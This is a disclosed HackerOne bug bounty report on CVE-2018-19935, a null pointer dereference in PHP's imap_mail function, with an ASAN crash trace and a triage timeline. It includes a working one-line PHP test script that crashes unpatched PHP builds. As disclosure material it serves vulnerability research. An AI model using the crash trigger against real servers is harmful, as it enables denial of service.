---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/out-of-bounds-read
  - env/web
substate: "resolved"
weakness: "Out-of-bounds Read"
enriched: true
body: true
date: 2020-11-09
submitted: 2018-12-06T03:30:36.662Z
bounty_usd: null
votes: 13
cve: "CVE-2018-19935"
program: "[[programs/ibb|Internet Bug Bounty]]"
reporter: "shuoz"
source: "https://hackerone.com/reports/456727"
title: "null pointer dereference in imap_mail"
---
# null pointer dereference in imap_mail

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 13 | **Program:** Internet Bug Bounty | **Disclosed:** 2020-11-09

- Report: [https://hackerone.com/reports/456727](https://hackerone.com/reports/456727)
- CWE: Out-of-bounds Read | CVE: CVE-2018-19935
- Submitted: 2018-12-06T03:30:36.662Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

in imap_mail if message args is null, in _php_imap_mail no check wheater message  can get, so crash.

```
     fprintf(sendmail, "\n%s\n", message);

```



/usr/local/php/bin/php ./craxxx.php 

Warning: imap_mail(): No message string in mail command in /home/fan/github/php-7.2.10/myselffuzz/craxxx.php on line 3
sh: 1: -t: not found
Segmentation fault (core dumped)







../sapi/cli/php ./craxxx.php 

Warning: imap_mail(): No message string in mail command in /home/fan/github/php-7.2.10/myselffuzz/craxxx.php on line 3
ASAN:SIGSEGV
=================================================================
==23766==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000018 (pc 0x7fae925d9cc0 bp 0x7ffcb6b27a10 sp 0x7ffcb6b274a0 T0)
sh: 1: -t: not found
    #0 0x7fae925d9cbf in vfprintf (/lib/x86_64-linux-gnu/libc.so.6+0x4ecbf)
    #1 0x7fae926a1bc8 in __fprintf_chk (/lib/x86_64-linux-gnu/libc.so.6+0x116bc8)
    #2 0xa5aeb0 in fprintf /usr/include/x86_64-linux-gnu/bits/stdio2.h:97
    #3 0xa5aeb0 in _php_imap_mail /home/fan/github/php-7.2.10/ext/imap/php_imap.c:4065
    #4 0xa5b22d in zif_imap_mail /home/fan/github/php-7.2.10/ext/imap/php_imap.c:4112
    #5 0x17da703 in ZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER /home/fan/Desktop/php-7.2.10/Zend/zend_vm_execute.h:573
    #6 0x17da703 in execute_ex /home/fan/Desktop/php-7.2.10/Zend/zend_vm_execute.h:59747
    #7 0x181b5c3 in zend_execute /home/fan/Desktop/php-7.2.10/Zend/zend_vm_execute.h:63776
    #8 0x1356ef2 in zend_execute_scripts /home/fan/Desktop/php-7.2.10/Zend/zend.c:1496
    #9 0x11c0776 in php_execute_script /home/fan/Desktop/php-7.2.10/main/main.c:2590
    #10 0x1823488 in do_cli /home/fan/Desktop/php-7.2.10/sapi/cli/php_cli.c:1011
    #11 0x18256f4 in main /home/fan/Desktop/php-7.2.10/sapi/cli/php_cli.c:1404
    #12 0x7fae925ab82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
    #13 0x440888 in _start (/home/fan/github/php-7.2.10/sapi/cli/php+0x440888)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV ??:0 vfprintf
==23766==ABORTING




Test script:
---------------
<?php
	imap_mail('1', 1, NULL);

?>

php bugs:
https://bugs.php.net/bug.php?id=77020

## Impact

IMAP

## Timeline

- **Report Filed**
- **2019-01-18** @h1_analyst_leon: Hey @shuoz - Thanks for the submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share. Thank you for your patience!
- **2019-04-04** @shuoz: this use cve-2018-19935
- **Cve Id Added**
- **Report Severity Updated**
- **Report Triaged**
- **2019-06-11** @shuoz: @tuxedo ok...
- **2020-09-13** @shuoz: any response?
- **Bounty Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
